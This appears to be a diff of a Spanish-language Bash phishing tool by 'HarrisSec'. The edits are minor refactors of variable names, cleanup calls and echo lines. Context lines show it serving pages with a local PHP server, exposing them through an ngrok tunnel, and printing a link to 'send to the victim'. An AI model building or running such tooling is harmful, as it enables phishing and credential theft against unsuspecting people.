@@ -1,4 +1,4 @@
-#Codigo by https://github.com/HarrisSec
+#Create by https://github.com/HarrisSec
 #Si copias deja creditos😛
 
 trap 'printf "\n";stop;exit 1' 2
@@ -17,7 +17,6 @@ brnd=`shuf -i 2-7 -n 1`
 banner="a$brnd"
 s="m"
 bcolor="\e[1;3$crnd$s"
-number='^[0-9]+$'
 #Banners
 dev(){
 echo -e "\e[1;92m					dev\e[1;39m > HarrisSec"
@@ -128,10 +127,9 @@ command -v git > /dev/null 2>&1 || { echo >&2 -e "$v[*]$b Installing git..."; pk
 }
 
 stop() {
-
-checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
+checkng=$(ps aux | grep -o "ngrok" | head -n1)
 checkphp=$(ps aux | grep -o "php" | head -n1)
-if [[ $checkngrok == *'ngrok'* ]]; then
+if [[ $checkng == *'ngrok'* ]]; then
 pkill -f -2 ngrok > /dev/null 2>&1
 killall -2 ngrok > /dev/null 2>&1
 fi
@@ -914,7 +912,6 @@ command -v ssh > /dev/null 2>&1 || { echo >&2 -e "$v[*]$b Instalando ssh..."; pk
 echo
 port=3333
 echo
-killphp
 php -S localhost:$port > /dev/null 2>&1 &
 echo -e "$v[$b*$v]$b Enpezando..."
 sleep 2
@@ -957,7 +954,6 @@ command -v ssh > /dev/null 2>&1 || { echo >&2 -e "$v[*]$b Instalando ssh..."; pk
 echo
 
 port=3333
-killphp
 echo
 php -S localhost:$port > /dev/null 2>&1 & 
 echo -e "$v[$b*$v]$b Enpezando..."
@@ -997,17 +993,11 @@ fi
 
 ngrok(){
 echo
-killphp
-
 php -S $link > /dev/null 2>&1 &
 echo -e "$v[$b*$v]$b Enpezando..."
 sleep 2
 cd $OLDPWD
-
 findngrok
-
-killng
-
 ./ngrok http $link > /dev/null 2>&1 &
 echo -e "$v[$b*$v]$b Verifica una buena conexión de internet"
 sleep 5
@@ -1022,6 +1012,7 @@ if [[ $envialink == "" ]];then
 echo -e "$r[!]$b No se pudo conectar, prueba otro servidor"
 exit 1
 else
+echo -e "$v[$b*$v]$b $link"
 echo -e "$v[$b*$v]$b Envia a la victima > \e[0;32m$envialink"
 cd $ruta_carpeta
 cutt
